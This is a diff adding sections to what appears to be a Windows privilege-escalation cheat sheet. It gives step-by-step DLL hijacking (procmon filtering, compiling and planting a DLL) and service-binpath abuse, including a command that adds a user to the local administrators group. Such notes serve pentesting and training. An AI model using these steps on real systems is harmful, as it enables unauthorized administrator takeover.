@@ -269,7 +269,48 @@
   7. PROFIT!
 
 ## DLL Hijacking
+  1. Transfer procmon to the local machine and run it as admin
+  2. In procmon select filter and enter the condition Ressult is NAME NOT FOUND then Inlcude and Path ends with .dll then Include
+  3. Check if the location of the dll is writeable.
+  4. Change line # in windows_dll.c to a user you control
+  5 Save the file and compile it:
+  ```bash
+  x86_64-w64-mingw32-gcc windows_service.c -o <NOT_FOUND.dll>
+  ```
+  5. Copy the generated file to the target in the location of the dll that was not found.
+  6. stop and start the service calling the dll
+  7. PROFIT!
 ## Service Permissions (Paths)
+### Binary Paths
+  1. Run PowerUp.ps1 and look for service pemissions where we can restart
+    ```cmd
+  powershell -ep bypass
+  . .\PowerUp.ps1
+  Invoke-AllChecks
+  ```
+  2. Run accesschk64.exe and look for SERVICE_CAN_START and SERVICE_CAN_STOP and SERVICE_CHANGE_CONFIG
+  ```cmd
+  accesschk64.exe --wuvc Everyone *
+  ```  
+  3. Enumerate the service further
+  ```cmd
+  accesschk64.exe -wuvc <service_name>
+  ```
+  5. Query the Service
+  ```cmd
+  sc qc <serice_name>
+  ```
+  6. Change the binpath
+  ```cmd
+  sc config binpath= "net localgroup administrators user /add"
+  ```
+  7. Start the Service
+  ```cmd
+  sc start <service_name>
+  ```
+  8. PROFIT!
+
+### Unquoted Service Paths
 ## CVE-2019-1388
 
 
